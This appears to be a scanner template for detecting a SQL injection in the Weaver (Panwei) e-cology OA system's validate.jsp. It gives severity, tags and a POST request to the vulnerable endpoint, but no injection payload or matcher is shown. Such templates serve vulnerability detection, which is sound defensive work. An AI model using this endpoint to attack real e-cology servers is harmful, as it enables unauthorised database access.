id: weaver-e-cology-validate-sqli
brief:
    title: Weaver e-cology Validate.JSP - SQL Injection
    by: SleepingBag945
    level: high
    about: In the validate.jsp file of the Panwei e-cology OA system, the parameter capitalid is not strictly filtered, which can lead to SQL injection vulnerabilities. An attacker can use this vulnerability ...
    label:
        - ecology
        - weaver
        - sqli
        - vuln
moves:
    - verb: POST
      to:
        - '{{BaseURL}}/cpt/manage/validate.jsp?sourcestring=validateNum'
      head:
        Content-Type: application/x-www-form-urlencoded
